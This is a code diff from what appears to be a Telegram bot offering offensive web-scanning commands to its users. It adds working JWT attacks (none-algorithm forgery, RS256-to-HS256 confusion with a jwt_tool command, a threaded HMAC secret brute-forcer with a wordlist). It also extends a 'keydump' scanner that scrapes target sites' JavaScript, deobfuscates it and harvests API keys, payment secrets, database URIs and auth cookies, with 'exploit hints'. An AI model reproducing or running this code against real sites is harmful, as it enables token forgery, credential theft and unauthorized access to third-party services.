+# ───────────────────────────────────────────────────────────────────
+
+import base64 as _b64
+
+_JWT_COMMON_SECRETS = [
+    "secret","password","123456","admin","key","jwt","token","test",
+    "changeme","mysecret","your-256-bit-secret","your-secret-key",
+    "secret_key","jwt_secret","app_secret","supersecret","private",
+    "qwerty","abc123","letmein","welcome","monkey","dragon","master",
+    "your-secret","secretkey","jwtpassword","pass","1234","12345",
+    "123456789","qwerty123","iloveyou","princess","rockyou","football",
+    "!@#$%^&*","pass123","admin123","root","toor","alpine","default",
+    "secret123","jwt-secret","token-secret","api-secret","app-key",
+    "HS256","RS256","none","null","undefined","example",
+]
+
+def _jwt_decode_payload(token: str) -> dict:
+    """Decode JWT header + payload without verification."""
+    parts = token.strip().split('.')
+    if len(parts) != 3:
+        return {"error": "Not a valid JWT (needs 3 parts separated by '.')"}
+    try:
+        def _b64_decode(s: str) -> dict:
+            # Correct padding: -len(s) % 4 gives 0 when already aligned
+            s = s.replace('-', '+').replace('_', '/')
+            s += '=' * (-len(s) % 4)
+            return json.loads(_b64.b64decode(s).decode('utf-8', 'replace'))
+        header  = _b64_decode(parts[0])
+        payload = _b64_decode(parts[1])
+        return {"header": header, "payload": payload, "signature": parts[2][:20] + "..."}
+    except Exception as e:
+        return {"error": str(e)}
+
+
+def _jwt_none_attack(token: str) -> dict:
+    """None algorithm bypass — also try 'NONE', 'None' variants."""
+    parts = token.split(".")
+    if len(parts) != 3:
+        return {"success": False}
+    try:
+        dec = _jwt_decode_payload(token)
+        if "error" in dec:
+            return {"success": False, "error": dec["error"]}
+        orig_alg = dec["header"].get("alg", "HS256")
+
+        variants = []
+        for alg_val in ("none", "None", "NONE", "nOnE"):
+            h = {**dec["header"], "alg": alg_val}
+            variants.append(f"{_b64url_encode(h)}.{parts[1]}.")
+
+        return {
+            "success":      True,
+            "original_alg": orig_alg,
+            "forged_tokens": variants,
+            "method":       "none_alg_bypass",
+            "note":         "Try all 4 case variants — some servers check case-insensitively.",
+        }
+    except Exception as e:
+        return {"success": False, "error": str(e)}
+
+
+def _jwt_alg_confusion(token: str) -> dict:
+    """RS256 → HS256 algorithm confusion attack."""
+    parts = token.split(".")
+    if len(parts) != 3:
+        return {"success": False}
+    try:
+        dec = _jwt_decode_payload(token)
+        if "error" in dec:
+            return {"success": False}
+        orig_alg = dec["header"].get("alg", "HS256")
+        if orig_alg in ("RS256", "RS384", "RS512", "ES256", "ES384"):
+            confused = {**dec["header"], "alg": "HS256"}
+            return {
+                "success":         True,
+                "original_alg":    orig_alg,
+                "target_alg":      "HS256",
+                "confused_header": _b64url_encode(confused),
+                "method":          "alg_confusion",
+                "note": (
+                    f"{orig_alg}→HS256 confusion: Change alg to HS256 then sign with "
+                    "the server's public key as the HMAC secret.\n"
+                    "Tool: jwt_tool.py\n"
+                    "CMD: python3 jwt_tool.py -X k -pk pubkey.pem <token>"
+                ),
+            }
+        return {"success": False, "note": f"Alg is `{escape_md(orig_alg)}` (RS/ES256 needed)"}
+    except Exception as e:
+        return {"success": False, "error": str(e)}
+
+
+def _jwt_brute_force(token: str, wordlist: list = None, progress_cb=None) -> dict:
+    """Parallel HMAC brute-force — significantly faster than sequential."""
+    import hmac as _hmac
+
+    parts = token.split(".")
+    if len(parts) != 3:
+        return {"cracked": False, "error": "Invalid JWT"}
+
+    target_algs = {
+        "HS256": hashlib.sha256,
+        "HS384": hashlib.sha384,
+        "HS512": hashlib.sha512,
+    }
+    header_info = _jwt_decode_payload(token).get("header", {})
+    alg = header_info.get("alg", "HS256")
+    if alg not in target_algs:
+        return {"cracked": False, "error": f"Algorithm `{escape_md(alg)}` not HMAC-brute-forceable"}
+
+    hash_fn   = target_algs[alg]
+    msg_bytes = f"{parts[0]}.{parts[1]}".encode()
+    sig_pad   = parts[2].replace("-", "+").replace("_", "/")
+    sig_pad  += "=" * (-len(sig_pad) % 4)
+    try:
+        target_sig = _b64.b64decode(sig_pad)
+    except Exception:
+        return {"cracked": False, "error": "Cannot decode signature"}
+
+    wl    = wordlist or _JWT_COMMON_SECRETS
+    total = len(wl)
+    found = [None]  # shared result
+
+    def _try_batch(secrets):
+        for secret in secrets:
+            if found[0]:
+                return
+            try:
+                computed = _hmac.new(secret.encode(), msg_bytes, hash_fn).digest()
+                if computed == target_sig:
+                    found[0] = secret
+                    return
+            except Exception:
+                pass
+
+    # Split into batches for parallel workers
+    batch_size = max(1, total // 8)
+    batches    = [wl[i:i + batch_size] for i in range(0, total, batch_size)]
+    done_count = [0]
+
+    with concurrent.futures.ThreadPoolExecutor(max_workers=8) as ex:
+        futures = [ex.submit(_try_batch, b) for b in batches]
+        for fut in concurrent.futures.as_completed(futures):
+            done_count[0] += 1
+            if progress_cb:
+                tried = min(done_count[0] * batch_size, total)
+                progress_cb(f"🔑 Brute-force: `{tried}/{total}` | Workers: 8")
+            if found[0]:
+                for f in futures:
+                    f.cancel()
+                break
+
+    if found[0]:
+        return {"cracked": True, "secret": found[0], "alg": alg,
+                "tried": wl.index(found[0]) + 1}
+    return {"cracked": False, "tried": total, "alg": alg}
 
 
 # ───────────────────────────────────────────────────────────────────
@@ -18855,6 +23751,38 @@ async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
             _save_db_sync(db2)
             new_state = db2["settings"]["bot_enabled"]
         await query.answer(f"Bot is now {'🟢 ON' if new_state else '🔴 OFF'}", show_alert=True)
+
+        # ── Bot OFF → cancel ALL active tasks + notify users ─────────────
+        if not new_state:
+            killed = 0
+            for task_uid, task in list(_user_tasks.items()):
+                if task and not task.done():
+                    task.cancel()
+                    killed += 1
+                    try:
+                        await context.bot.send_message(
+                            chat_id=task_uid,
+                            text=(
+                                "🔴 *Bot ကို Admin မှ ပိတ်လိုက်ပါသည်*\n"
+                                "⚙️ လက်ရှိ operation ရပ်သွားပါပြီ\n"
+                                "_Bot ပြန်ဖွင့်မှ သုံးနိုင်မည်_"
+                            ),
+                            parse_mode='Markdown'
+                        )
+                    except Exception:
+                        pass
+            # cancel download flags too
+            for ev_uid, ev in list(_cancel_flags.items()):
+                if ev and not ev.is_set():
+                    ev.set()
+                    killed += 1
+            _user_tasks.clear()
+            if killed:
+                await query.message.reply_text(
+                    f"🛑 Active operations `{killed}` ကို ရပ်လိုက်ပါပြီ",
+                    parse_mode='Markdown'
+                )
+
         async with db_lock:
             db3 = _load_db_sync()
         await _send_admin_panel(query, db3)
@@ -18871,6 +23799,78 @@ async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         kb = [[InlineKeyboardButton("🔙 Back", callback_data="adm_back")]]
         await query.edit_message_text(
             "\n".join(lines) if len(lines)>1 else "Empty",
+            reply_markup=InlineKeyboardMarkup(kb), parse_mode='Markdown'
+        )
+
+    elif data == "adm_proxy":
+        st   = proxy_manager.stats()
+        icon = "🟢" if st["enabled"] else "🔴"
+        kb   = [[InlineKeyboardButton("🔙 Back", callback_data="adm_back")]]
+        await query.edit_message_text(
+            f"🌐 *Proxy Status*\n"
+            f"━━━━━━━━━━━━━━━━━━━━\n"
+            f"{icon} Status  : `{'ENABLED' if st['enabled'] else 'DISABLED'}`\n"
+            f"📋 Total  : `{st['total']}`\n"
+            f"✅ Live   : `{st['live']}`\n"
+            f"⏳ Cooldown: `{st['in_cooldown']}`\n"
+            f"🚀 Free   : `{st['available']}`\n\n"
+            f"Use `/proxy reload` to refresh",
+            reply_markup=InlineKeyboardMarkup(kb), parse_mode='Markdown'
+        )
+
+    elif data == "adm_active":
+        active = [(uid, t) for uid, t in _user_tasks.items() if t and not t.done()]
+        kb = [[InlineKeyboardButton("🔙 Back", callback_data="adm_back")]]
+        if not active:
+            txt = "📡 *Active Scans*\n━━━━━━━━━━━━━━━━━━━━\n\n✅ ဘာမှ run မနေပါ"
+        else:
+            lines = ["📡 *Active Scans*", "━━━━━━━━━━━━━━━━━━━━", ""]
+            for task_uid, task in active:
+                u_data = db["users"].get(str(task_uid), {})
+                name   = u_data.get("name", f"uid:{task_uid}")
+                lines.append(f"🔄 `{escape_md(name)}` (`{task_uid}`)")
+            lines.append(f"\n🔢 Total: `{len(active)}/{MAX_WORKERS}`")
+            txt = "\n".join(lines)
+        await query.edit_message_text(txt, reply_markup=InlineKeyboardMarkup(kb), parse_mode='Markdown')
+
+    elif data == "adm_killall":
+        killed = 0
+        for task_uid, task in list(_user_tasks.items()):
+            if task and not task.done():
+                task.cancel()
+                killed += 1
+                try:
+                    await context.bot.send_message(
+                        chat_id=task_uid,
+                        text="🛑 *Admin မှ operation ရပ်လိုက်ပါသည်*",
+                        parse_mode='Markdown'
+                    )
+                except Exception:
+                    pass
+        for ev_uid, ev in list(_cancel_flags.items()):
+            if ev and not ev.is_set():
+                ev.set()
+                killed += 1
+        _user_tasks.clear()
+        await query.answer(f"🛑 {killed} tasks killed", show_alert=True)
+        async with db_lock:
+            db_r = _load_db_sync()
+        await _send_admin_panel(query, db_r)
+
+    elif data == "adm_broadcast_prompt":
+        kb = [[InlineKeyboardButton("🔙 Back", callback_data="adm_back")]]
+        await query.edit_message_text(
+            "📢 *Broadcast*\n━━━━━━━━━━━━━━━━━━━━\n\n"
+            "Command ကိုသုံးပါ:\n`/broadcast <message>`",
+            reply_markup=InlineKeyboardMarkup(kb), parse_mode='Markdown'
+        )
+
+    elif data == "adm_ban_prompt":
+        kb = [[InlineKeyboardButton("🔙 Back", callback_data="adm_back")]]
+        await query.edit_message_text(
+            "🚫 *Ban User*\n━━━━━━━━━━━━━━━━━━━━\n\n"
+            "Command ကိုသုံးပါ:\n`/ban <user_id>`\n`/unban <user_id>`\n\n"
+            "User ID ကြည့်ရန်:\n`/allusers` သို့မဟုတ် `/userinfo <id>`",
             reply_markup=InlineKeyboardMarkup(kb), parse_mode='Markdown'
         )
 
@@ -19548,6 +24548,120 @@ def _is_obfuscated(js_text: str) -> tuple:
 
 
 # ═══════════════════════════════════════════════════════════════
+# 🧩  SHARED DE-OBFUSCATION LAYER
+# Used by keydump, paykeys, sitekey, firebase as a corpus pre-processor.
+# Call: extra = _deobfuscate_text(js_text) → append to scan corpus.
+# ═══════════════════════════════════════════════════════════════
+
+def _deobfuscate_text(text: str) -> str:
+    """
+    Decode common JS obfuscation patterns and return decoded strings
+    as a single block to append to any scan corpus.
+
+    Patterns handled:
+      1. atob("...") / Buffer.from("...","base64")
+      2. Hex escape sequences  "\\x73\\x6b..."
+      3. Unicode escapes       "\\u0073\\u006b..."
+      4. Array join tricks     ["sk","_live","_xx"].join("")
+      5. String.fromCharCode(115,107,95,...)
+      6. Simple string concat  "sk" + "_live" + "_secret_xxx"
+      7. Hex string → printable ASCII  (32-char raw hex values)
+    """
+    import base64 as _b64
+    decoded_parts: list = []
+
+    # ── 1. Base64 atob() / Buffer.from(...,"base64") ──────────────
+    for m in re.finditer(
+        r'(?:atob|Buffer\.from)\s*\(\s*["\']([A-Za-z0-9+/]{12,}={0,2})["\']'
+        r'(?:\s*,\s*["\']base64["\'])?\s*\)',
+        text
+    ):
+        raw = m.group(1)
+        try:
+            decoded = _b64.b64decode(raw + "==").decode("utf-8", errors="replace")
+            if len(decoded) >= 8 and decoded.isprintable():
+                decoded_parts.append(decoded)
+        except Exception:
+            pass
+
+    # ── 2. Hex escape  \x73\x6b\x5f... ───────────────────────────
+    for m in re.finditer(r'"((?:\\x[0-9a-fA-F]{2}){5,})"', text):
+        raw = m.group(1)
+        try:
+            decoded = re.sub(r'\\x([0-9a-fA-F]{2})',
+                              lambda hm: chr(int(hm.group(1), 16)), raw)
+            if len(decoded) >= 6:
+                decoded_parts.append(decoded)
+        except Exception:
+            pass
+
+    # ── 3. Unicode escape  \u0073\u006b... ───────────────────────
+    for m in re.finditer(r'"((?:\\u[0-9a-fA-F]{4}){4,})"', text):
+        raw = m.group(1)
+        try:
+            decoded = raw.encode("utf-8").decode("unicode_escape")
+            if len(decoded) >= 6:
+                decoded_parts.append(decoded)
+        except Exception:
+            pass
+
+    # ── 4. Array join trick  ["sk","_live","_xx"].join("") ────────
+    for m in re.finditer(
+        r'\[([^\]]{8,300})\]\s*\.join\s*\(\s*["\']["\']?\s*\)', text
+    ):
+        raw = m.group(1)
+        try:
+            parts  = re.findall(r'["\']([^"\']*)["\']', raw)
+            joined = "".join(parts)
+            if len(joined) >= 8:
+                decoded_parts.append(joined)
+        except Exception:
+            pass
+
+    # ── 5. String.fromCharCode(115,107,95,...) ────────────────────
+    for m in re.finditer(r'String\.fromCharCode\(([0-9,\s]{8,300})\)', text):
+        raw = m.group(1)
+        try:
+            codes   = [int(c.strip()) for c in raw.split(",") if c.strip().isdigit()]
+            decoded = "".join(chr(c) for c in codes if 32 <= c < 127)
+            if len(decoded) >= 6:
+                decoded_parts.append(decoded)
+        except Exception:
+            pass
+
+    # ── 6. String concatenation  "sk" + "_live" + "_secret_xxx" ──
+    for m in re.finditer(
+        r'(?:=|:|\()\s*["\']([A-Za-z0-9_\-]{2,30})["\']'
+        r'(?:\s*\+\s*["\']([^"\']{1,50})["\'])+',
+        text
+    ):
+        try:
+            all_parts = re.findall(r'["\']([^"\']*)["\']', m.group(0))
+            joined    = "".join(all_parts)
+            if len(joined) >= 10:
+                decoded_parts.append(joined)
+        except Exception:
+            pass
+
+    # ── 7. Raw hex string → printable ASCII ───────────────────────
+    for m in re.finditer(r'["\']([0-9a-fA-F]{32,128})["\']', text):
+        raw = m.group(1)
+        if len(raw) % 2 != 0:
+            continue
+        try:
+            decoded = bytes.fromhex(raw).decode("utf-8", errors="replace")
+            if (decoded.isprintable() and len(decoded) >= 12
+                    and re.search(r'(?i)(key|secret|token|api|auth|pass|sk_|pk_)', decoded)):
+                decoded_parts.append(decoded)
+        except Exception:
+            pass
+
+    if not decoded_parts:
+        return ""
+    return "\n// [DEOBFUSCATED]\n" + "\n".join(decoded_parts)
+
+
+# ═══════════════════════════════════════════════════════════════
 
 def _entropy(s: str) -> float:
     """Calculate Shannon entropy of a string."""
@@ -20219,6 +25333,18 @@ def _run_keydump_sync(url: str) -> dict:
 
     _kd_pattern_scan(corpus)  # main corpus
 
+    # ── 2b. Deobfuscation pass — decode atob/hex/unicode/join/fromCharCode ────
+    _deob_hits = 0
+    for _js_text in ([data["html"]] + [_js for _, _js in data["js_sources"]] + inline_scripts):
+        if len(_js_text) < 50:
+            continue
+        _extra = _deobfuscate_text(_js_text)
+        if _extra:
+            _deob_hits += 1
+            _kd_pattern_scan(_extra, "[deobfuscated]")
+    if _deob_hits:
+        out["deobfuscated_files"] = _deob_hits
+
     # ── 3. High-entropy — threshold 4.2 (was 4.5) ────────────────────────────
     # Lowering from 4.5 → 4.2 catches more real secrets (AWS, GCP tokens,
     # random API keys) while hex-32/hex-64 patterns add structural coverage.
@@ -20416,118 +25542,86 @@ def _run_keydump_sync(url: str) -> dict:
     except Exception as _enh_e:
         out["errors"].append(f"ENH scan: {_enh_e}")
 
+    # ── Sitekey extraction from API responses ─────────────────────────────────
+    try:
+        _kd_live_r  = out.get("live_result") or {}
+        _kd_html    = data.get("html", "")
+        _kd_all_js  = {js_url: js_text for js_url, js_text in data.get("js_sources", [])}
+        out["sitekeys"] = _extract_sitekeys_from_data(_kd_html, _kd_all_js, _kd_live_r, url)
+    except Exception as _sk_e:
+        out["errors"].append(f"Sitekey extract: {_sk_e}")
+        out["sitekeys"] = []
+
     return out
 
 
 def _kd_confidence(label: str, value: str) -> tuple:
     """
-    Phase 3+: Assign confidence level + numeric score to a keydump hit.
-    Returns (badge: str, level: str, score: int)
-      CRITICAL (90-100) — live secret/private keys with direct exploitation path
-      HIGH     (65-89)  — known prefixes, test secrets, DB URIs
-      MEDIUM   (35-64)  — API/token patterns with keyword context
-      LOW      (0-34)   — entropy-only, analytics IDs, weak context
+    Phase 3: Assign confidence level to a keydump hit.
+    Returns (badge: str, level: str)
+      HIGH  — known prefix/format that is unambiguous (AKIA, pk_live_, ghp_, etc.)
+      MED   — pattern match with keyword context but no unique prefix
+      LOW   — entropy-only or weak-context match
     """
     v = value.strip()
-    lbl = label.lower()
-
-    # ── CRITICAL: live payment/secret keys with immediate exploitation value ──
-    CRITICAL_PREFIXES = (
-        "sk_live_",                       # Stripe live SECRET (full API access)
-        "rk_live_",                       # Stripe live RESTRICTED key
-        "-----BEGIN",                     # PEM private key / cert
-        "mongodb://", "mongodb+srv://",   # DB URI with credentials
+    # ── HIGH confidence: hard vendor prefixes ────────────────────────────────
+    HIGH_PREFIXES = (
+        "AKIA", "ASIA", "AROA",          # AWS keys
+        "AIza",                          # GCP / Firebase
+        "dop_v1_",                       # DigitalOcean
+        "sk-ant-",                       # Anthropic
+        "hf_",                           # HuggingFace
+        "ghp_", "gho_", "ghu_",          # GitHub PAT
+        "ghs_", "ghr_",                  # GitHub Actions
+        "glpat-",                        # GitLab
+        "npm_",                          # NPM
+        "xoxb-", "xoxp-", "xapp-",      # Slack tokens
+        "SG.",                           # SendGrid
+        "pk_live_", "pk_test_",          # Stripe publishable
+        "sk_live_", "sk_test_",          # Stripe secret
+        "whsec_",                        # Stripe webhook
+        "rk_live_", "rk_test_",          # Stripe restricted
+        "sq0idp-", "sq0atp-",            # Square
+        "rzp_live_", "rzp_test_",        # Razorpay
+        "AQE",                           # Adyen
+        "EAAa",                          # Facebook access token
+        "eyJ",                           # JWT (structural)
+        "-----BEGIN",                    # PEM private key
+        "pk.eyJ",                        # Mapbox
+        "sk-",                           # OpenAI (sk- prefix)
+        "AC",                            # Twilio SID (AC + 32 hex)
+        "mongodb://", "mongodb+srv://",  # DB URIs
         "postgres://", "postgresql://",
         "mysql://", "mysql2://",
         "redis://", "rediss://",
     )
-    CRITICAL_LABELS = (
-        "secret key", "private key", "webhook secret",
-        "paymentintent client_secret", "stripe secret",
-        "live secret", "master key",
-    )
-    for prefix in CRITICAL_PREFIXES:
+    # HIGH: value starts with a hard prefix
+    for prefix in HIGH_PREFIXES:
         if v.startswith(prefix):
-            # DB URIs only CRITICAL if they contain credentials (@)
-            if "://" in v and "@" not in v and prefix in ("mongodb://","mongodb+srv://","postgres://","postgresql://","mysql://","mysql2://","redis://","rediss://"):
-                break
-            score = 95 if "live" in v.lower() or "-----BEGIN" in v else 90
-            return (f"🔴 CRITICAL", "CRITICAL", score)
-    for kw in CRITICAL_LABELS:
-        if kw in lbl:
-            score = 95 if "live" in lbl else 90
-            return ("🔴 CRITICAL", "CRITICAL", score)
-    # CRITICAL: URL-form credentials
+            return ("🟢 HIGH", "HIGH")
+    # HIGH: label explicitly names a live key
+    if any(x in label for x in ("live", "Live", "Private Key", "Secret Key", "Webhook Secret")):
+        return ("🟢 HIGH", "HIGH")
+    # HIGH: URL-form credentials (contains :// and @ → auth in URI)
     if "://" in v and "@" in v:
-        return ("🔴 CRITICAL", "CRITICAL", 92)
+        return ("🟢 HIGH", "HIGH")
 
-    # ── HIGH: known vendor prefixes, live publishable, test secrets ──────────
-    HIGH_PREFIXES_SCORED = [
-        ("pk_live_",  80, "Stripe/Pay live publishable"),
-        ("pk_test_",  70, "Stripe/Pay test publishable"),
-        ("sk_test_",  78, "Stripe test secret"),
-        ("whsec_",    82, "Stripe webhook secret"),
-        ("AKIA", 85, "AWS Access Key"),
-        ("ASIA", 83, "AWS Temp Key"),
-        ("AROA", 80, "AWS Role Key"),
-        ("AIza", 80, "GCP/Firebase API Key"),
-        ("dop_v1_", 82, "DigitalOcean token"),
-        ("sk-ant-", 85, "Anthropic API key"),
-        ("hf_", 78, "HuggingFace token"),
-        ("ghp_", 82, "GitHub PAT"),
-        ("gho_", 80, "GitHub OAuth token"),
-        ("ghu_", 80, "GitHub user token"),
-        ("ghs_", 78, "GitHub Actions secret"),
-        ("ghr_", 78, "GitHub refresh token"),
-        ("glpat-", 82, "GitLab PAT"),
-        ("npm_", 78, "NPM token"),
-        ("xoxb-", 85, "Slack bot token"),
-        ("xoxp-", 83, "Slack user token"),
-        ("xapp-", 80, "Slack app token"),
-        ("SG.", 80, "SendGrid API key"),
-        ("rzp_live_", 78, "Razorpay live key"),
-        ("rzp_test_", 68, "Razorpay test key"),
-        ("FLWPUBK-", 75, "Flutterwave live"),
-        ("AQE", 72, "Adyen client key"),
-        ("EAAa", 80, "Facebook access token"),
-        ("eyJ", 65, "JWT token"),
-        ("pk.eyJ", 70, "Mapbox token"),
-        ("sk-", 75, "OpenAI API key"),
-        ("sq0atp-", 80, "Square access token"),
-        ("sq0idp-", 72, "Square app ID"),
-    ]
-    for prefix, score, _ in HIGH_PREFIXES_SCORED:
-        if v.startswith(prefix):
-            return (f"🟠 HIGH", "HIGH", score)
-    # HIGH: label names a live key explicitly
-    if any(x in label for x in ("live", "Live", "Webhook Secret")):
-        return ("🟠 HIGH", "HIGH", 75)
-    # HIGH: Twilio SID (AC + 32 hex chars)
-    if re.match(r"^AC[a-f0-9]{32}$", v):
-        return ("🟠 HIGH", "HIGH", 78)
-
-    # ── MEDIUM: keyword-context pattern, mixed-case long strings ─────────────
+    # ── MED confidence: keyword-context pattern hits ──────────────────────────
     MED_LABELS = (
-        "api key", "access token", "auth token", "bearer",
-        "password", "secret", "credential", "client id", "client secret",
-        "firebase", "analytics", "tag manager", "pixel",
-        "recaptcha", "hcaptcha", "turnstile", "captcha",
-        "sendgrid", "mailchimp", "twilio", "pusher",
-        "mapbox", "algolia", "intercom",
+        "API Key", "Access Token", "Auth", "Bearer", "Password",
+        "Secret", "Credential", "Token", "Client ID", "Client Secret",
+        "Firebase", "Analytics", "Tag Manager", "Pixel",
+        "reCAPTCHA", "hCaptcha", "Turnstile",
     )
     for kw in MED_LABELS:
-        if kw in lbl:
-            score = 55 if any(x in lbl for x in ("test", "public", "analytics")) else 45
-            return ("🟡 MEDIUM", "MEDIUM", score)
-    # MEDIUM: long mixed-case alphanumeric (entropy proxy)
-    if len(v) >= 32 and re.search(r"[A-Z]", v) and re.search(r"[a-z]", v) and re.search(r"\d", v):
-        return ("🟡 MEDIUM", "MEDIUM", 40)
-    if len(v) >= 24 and re.search(r"[A-Z]", v) and re.search(r"[a-z]", v) and re.search(r"\d", v):
-        return ("🟡 MEDIUM", "MEDIUM", 35)
+        if kw.lower() in label.lower():
+            return ("🟡 MED", "MED")
+    # MED: long alphanumeric string (≥24 chars, mixed case)
+    if len(v) >= 24 and re.search(r'[A-Z]', v) and re.search(r'[a-z]', v) and re.search(r'\d', v):
+        return ("🟡 MED", "MED")
 
-    # ── LOW: short, digits-only, analytics IDs, unknown context ──────────────
-    score = 25 if len(v) >= 16 else 15
-    return ("🟢 LOW", "LOW", score)
+    # ── LOW: everything else (short strings, digits-only, analytics IDs) ─────
+    return ("⚪ LOW", "LOW")
 
 
 def _format_keydump_report(result: dict) -> tuple:
@@ -20547,17 +25641,13 @@ def _format_keydump_report(result: dict) -> tuple:
 
     total_hits = sum(len(v) for cat in cats.values() for v in cat.values())
 
-    # ── Confidence tally (CRITICAL/HIGH/MEDIUM/LOW + avg score) ─────────────
-    conf_counts = {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0}
-    conf_scores = []
+    # ── Confidence tally ──────────────────────────────────────────────────────
+    conf_counts = {"HIGH": 0, "MED": 0, "LOW": 0}
     for cat_data in cats.values():
         for label, vals in cat_data.items():
             for v in vals:
-                _, lvl, sc = _kd_confidence(label, v)
+                _, lvl = _kd_confidence(label, v)
                 conf_counts[lvl] += 1
-                conf_scores.append(sc)
-    top_score = max(conf_scores) if conf_scores else 0
-    avg_score = int(sum(conf_scores)/len(conf_scores)) if conf_scores else 0
 
     js_mode    = "⚡ JS+Static+Dynamic+LiveStream" if PLAYWRIGHT_OK else "📄 Static+JS"
     inline_cnt = result.get("inline_scripts", 0)
@@ -20568,11 +25658,9 @@ def _format_keydump_report(result: dict) -> tuple:
 
     # ── Confidence summary line ───────────────────────────────────────────────
     conf_line = (
-        f"🔴 `{conf_counts['CRITICAL']}` CRITICAL  "
-        f"🟠 `{conf_counts['HIGH']}` HIGH  "
-        f"🟡 `{conf_counts['MEDIUM']}` MEDIUM  "
-        f"🟢 `{conf_counts['LOW']}` LOW  "
-        f"| Top Score: `{top_score}` / Avg: `{avg_score}`"
+        f"🟢 `{conf_counts['HIGH']}` HIGH  "
+        f"🟡 `{conf_counts['MED']}` MED  "
+        f"⚪ `{conf_counts['LOW']}` LOW"
     )
     live_line = (
         f"🔴 Live stream: `{escape_md(live_reqs)}` requests | "
@@ -20620,15 +25708,12 @@ def _format_keydump_report(result: dict) -> tuple:
                 count = sum(len(v) for v in cat_data.values())
                 lines.append(f"{cat_icon} *{cat_name}* `({count})`")
                 for label, vals in cat_data.items():
-                    if vals:
-                        badge, _, sc = _kd_confidence(label, vals[0])
-                    else:
-                        badge, sc = "🟢 LOW", 0
-                    lines.append(f"  ┌ {badge} `score:{sc}` *{label}*")
+                    badge, _ = _kd_confidence(label, vals[0]) if vals else ("⚪ LOW", "LOW")
+                    lines.append(f"  ┌ {badge} *{label}*")
                     for v in vals[:3]:
                         safe = v.replace("`", "'")
                         lines.append(f"  └ `{safe[:70]}`")
-                    # ── Exploit hint ──────────────────────────────────────
+                    # ── Exploit hint (unique to v18) ──────────────────────
                     hint = _kd_exploit_hint(label)
                     if hint:
                         lines.append(f"  ⚡ _{escape_md(hint[:90])}_")
@@ -20664,7 +25749,7 @@ def _format_keydump_report(result: dict) -> tuple:
         if interesting_cookies:
             lines.append(f"🍪 *Auth Cookies* `({len(interesting_cookies)})`")
             for c in interesting_cookies[:5]:
-                badge, _, _sc = _kd_confidence("Token", c["value"])
+                badge, _ = _kd_confidence("Token", c["value"])
                 _cn = c['name'].replace('`', "'")
                 _cv = c['value'][:50].replace('`', "'")
                 lines.append(f"  {badge} `{_cn}` = `{_cv}`")
@@ -20674,7 +25759,7 @@ def _format_keydump_report(result: dict) -> tuple:
         if entropy:
             lines.append(f"🔬 *High-Entropy Strings* `(H≥4.2)` — `{len(entropy)}` found")
             for item in entropy[:6]:
-                badge, _, _sc = _kd_confidence("entropy", item["value"])
+                badge, _ = _kd_confidence("entropy", item["value"])
                 _ev = item['value'][:55].replace('`', "'")
                 lines.append(
                     f"  {badge} H=`{item['entropy']}` `{_ev}`"
@@ -20687,6 +25772,11 @@ def _format_keydump_report(result: dict) -> tuple:
             for sm in smaps[:3]:
                 lines.append(f"  `{escape_md(sm[-60:])}`")
             lines.append("")
+
+    # ── Sitekey section (Captcha API response capture) ───────────────────────
+    sitekeys = result.get("sitekeys", [])
+    if sitekeys:
+        lines += _format_sitekey_section(sitekeys)
 
     lines += [
         "━━━━━━━━━━━━━━━━━━━━",
@@ -20768,7 +25858,7 @@ async def cmd_keydump(update: Update, context: ContextTypes.DEFAULT_TYPE):
     )
 
     try:
-        result = await asyncio.to_thread(_run_keydump_sync, url)
+        result = await run_scan(uid, _run_keydump_sync, url)
     except Exception as e:
         await msg.edit_text(
             f"❌ *KeyDump Error*\n`{type(e).__name__}: {str(e)[:100]}`",
@@ -20799,36 +25889,7 @@ async def cmd_keydump(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.effective_message.reply_text(
             _truncate_safe_md(report), parse_mode="Markdown")
 
-    # ── Deobfuscation layer — keydump JS ထဲ obfuscated secrets ရှာ ──────────
-    try:
-        texts_for_deob = {}
-        for item in result.get("network_log", []):
-            ct   = item.get("content_type", "") or ""
-            body = item.get("response_body", "") or item.get("body", "") or ""
-            if ("javascript" in ct or item.get("url","").endswith(".js")) and body:
-                lbl = item.get("url","?").split("/")[-1][:40]
-                texts_for_deob[lbl] = body
-        texts_for_deob["[HTML]"] = result.get("html", "")
-        deob_findings = await asyncio.to_thread(_deobfuscate_layer, texts_for_deob)
-        # Only report HIGH risk — in_secret_context + entropy >= 4.5
-        high_deob = [f for f in deob_findings
-                     if f["in_secret_context"] and f["entropy"] >= 4.5]
-        if high_deob:
-            deob_lines = [f"🧩 *Deobfuscated Secrets — `{escape_md(domain)}`*",
-                          "━━━━━━━━━━━━━━━━━━━━",
-                          f"🔴 High-risk decoded: `{len(high_deob)}`\n"]
-            for i, f in enumerate(high_deob[:10], 1):
-                deob_lines.append(f"*[{i}]* `{escape_md(f['method'])}` H=`{f['entropy']}`")
-                deob_lines.append(f"  ✅ `{escape_md(f['decoded'][:80])}`")
-                deob_lines.append(f"  📂 _{escape_md(f['source'])}_\n")
-            deob_lines.append("⚠️ _Authorized testing only_")
-            await update.effective_message.reply_text(
-                _truncate_safe_md("\n".join(deob_lines)), parse_mode='Markdown')
-    except Exception as deob_err:
-        logger.debug("keydump deobfuscate layer error: %s", deob_err)
 
-
-# ဒီနေရာမှာ Function Name ကို အသစ်ပြန်ထည့်ပေးလိုက်ပါ
 async def keydump_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Handle /keydump inline buttons: raw, entropy, json export"""
     query = update.callback_query
@@ -20836,12 +25897,12 @@ async def keydump_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await query.answer()
     except Exception:
         pass
-    data = query.data
-    # kd_raw_UID | kd_entropy_UID | kd_json_UID
+    data = query.data   # kd_raw_UID | kd_entropy_UID | kd_json_UID
+
     try:
-        parts = data.split("_")
-        action = parts[1]  # raw / entropy / json
-        uid = int(parts[2])
+        parts  = data.split("_")
+        action = parts[1]                    # raw / entropy / json
+        uid    = int(parts[2])
     except Exception:
         return
 
@@ -20894,6 +25955,7 @@ async def keydump_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 "findings":    result["raw_hits"],
                 "high_entropy": result["high_entropy"],
                 "source_maps": result["source_maps"],
+                "sitekeys":    result.get("sitekeys", []),
                 "dynamic":     {
                     "intercepted_requests": result["dynamic"]["requests"],
                     "auth_cookies": [
@@ -20961,6 +26023,7 @@ async def cmd_kdexport(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "findings":     result["raw_hits"],
